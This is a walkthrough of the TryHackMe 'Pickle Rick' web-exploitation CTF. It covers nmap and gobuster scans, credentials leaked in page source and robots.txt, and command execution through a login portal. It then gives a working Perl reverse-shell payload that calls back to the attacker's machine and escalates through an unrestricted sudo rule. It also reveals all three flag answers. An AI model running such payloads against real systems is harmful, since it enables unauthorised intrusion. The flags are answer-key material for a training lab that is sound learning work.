# Pickle Rick - TryHackMe CTF
A [Rick and Morty CTF](https://tryhackme.com/r/room/picklerick). Helping turn Rick back into a human!
<br />**Category**: Web Exploitation  
**Difficulty**: Easy  
**Note**: Different IP addresses throughout the CTF is due to restarting the machine.

## Step 1: Initial Reconnaissance (Nmap & Gobuster)
Per usual, begin with scanning machine ports. 
<br />**Nmap Command**: `nmap -T4 -sC -sV -A -p- -oN nmap/initial 10.10.156.56`
<br />**Command Breakdown**:
<br />`-T4` : specifies speed of scan (4)
<br />`-sC` : scans with using Nmap Scripting Engine (NSE)
<br />`-sV` : attempts to identify the version of the services 
<br />`-A` : performs an etensive scan on ports
<br />`-p-` : scans all ports
<br />`-oN nmap/initial` : formats name and parth of the file that Nmap is to save the scan results

### Nmap Scan Results
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-12 00:22 EST
Nmap scan report for 10.10.156.56
Host is up (0.089s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 65:8a:1a:23:73:b3:1b:94:76:4a:93:44:3c:47:77:b8 (RSA)
|   256 3e:11:f1:e5:34:0d:0b:51:2a:81:39:7e:db:11:09:89 (ECDSA)
|_  256 e3:82:cd:ed:95:51:67:f0:0e:a6:14:f5:54:4a:c4:12 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Rick is sup4r cool
|_http-server-header: Apache/2.4.41 (Ubuntu)
```
The Nmap scan results show that Port `22` (SSH) is open and running and that Port `80` (HTTP) is open and where we find our web service running. It also tells us that its running an Apache webserver on Ubuntu.

### Second, I ran a Gobuster scan on the website.
**Gobuster Command**: `gobuster dir -u http://10.10.86.166/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,sh,txt,cgi,html,js,css,py`
<br />**Command Breakdown**:
<br />`dir`: specifies directory enumeration.
<br />`-u`: specifies our target
<br />`-w`: path to wordlist being used (directory-list-2.3-medium.txt)
<br />`-x`: specifies the following extentions
<br />`php,sh,txt,cgi,html,js,css,py`: 

### Gobuster Scan Results
```
===============================================================
/.php                 (Status: 403) [Size: 277]
/.html                (Status: 403) [Size: 277]
/index.html           (Status: 200) [Size: 1062]
/login.php            (Status: 200) [Size: 882]
/assets               (Status: 301) [Size: 313] [--> http://10.10.86.166/assets/]
/portal.php           (Status: 302) [Size: 0] [--> /login.php]
/robots.txt           (Status: 200) [Size: 17]
```
The Gobuster results tell us of a `/robots.txt` directory, a login portal located at `/login.php`, and a viewable assets folder (`/assets`)
## Step 2: Enumeration
Upon looking at the source code of the website we find a comment that leaks some information.
```
  <!--

    Note to self, remember username!

    Username: R1ckRul3s

  -->
```
Upon viewing the contents of the `/robots.txt`, we find the exclusively the text `Wubbalubbadubdub`. The username leaked in the source code and the text in the `/robots.txt` file were valid credentials for the login portal.
### Portal cmd panel
`/portal.php` presents a page with multiple tabs that can only be viewed by the REAL rick. The only one currently accessible is the commands page, that has an interactive command line.
<br />Running `ls -lA` reveals:
```
total 32
-rwxr-xr-x 1 ubuntu ubuntu   17 Feb 10  2019 Sup3rS3cretPickl3Ingred.txt
drwxrwxr-x 2 ubuntu ubuntu 4096 Feb 10  2019 assets
-rwxr-xr-x 1 ubuntu ubuntu   54 Feb 10  2019 clue.txt
-rwxr-xr-x 1 ubuntu ubuntu 1105 Feb 10  2019 denied.php
-rwxrwxrwx 1 ubuntu ubuntu 1062 Feb 10  2019 index.html
-rwxr-xr-x 1 ubuntu ubuntu 1438 Feb 10  2019 login.php
-rwxr-xr-x 1 ubuntu ubuntu 2044 Feb 10  2019 portal.php
-rwxr-xr-x 1 ubuntu ubuntu   17 Feb 10  2019 robots.txt
```
The `Sup3rS3cretPickl3Ingred.txt` clearly stands out here. Upon attempting to open it using `cat` we find out the command is disabled "to make it hard for future PICKLEEEE RICCCKKKK." This is the same for `head`.

However, I could simply browse text files from the webserver. `http://10.10.86.166/Sup3rS3cretPickl3Ingred.txt` This revealed the first ingredient: `mr. meeseek hair`

`clue.txt` contained: `Look around the file system for the other ingredient.`

## Step 3: Reverse Shell!!!
It is now time to attempt to gain a reverse shell connection. Upon running `perl --version` we get this response:
```
This is perl 5, version 30, subversion 0 (v5.30.0) built for x86_64-linux-gnu-thread-multi
(with 60 registered patches, see perl -V for more detail)...
```
Which tells us perl 5 is installed on the system. We can use this information to our advantage in creating a reverse shell connection. Heading over to [Pentest Monkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) to grab a Perl payload. After setting up a `netcat` listner  the following payload worked:
```
perl -e 'use Socket;$i="10.6.12.48";$p=9999;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
After doing some looking around, I discovered the `/home/rick` folder which contained `second ingredients`. After using `cat "second ingredients"` we get our second ingredient: `1 jerry tear`

In search for the final ingredient, which is the final flag of this CTF, I ran `sudo -l` to see what privileges the user had. The response:
```
Matching Defaults entries for www-data on ip-10-10-86-166:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-10-86-166:
    (ALL) NOPASSWD: ALL
```
This means that I did not need a password to run `sudo` commands. I ran `sudo ls /root/` to view the root user content, where I discovered `3rd.txt`. `sudo cat /root/3rd.txt` returns the content of the `3rd.txt` and our final ingredient: `fleeb juice`
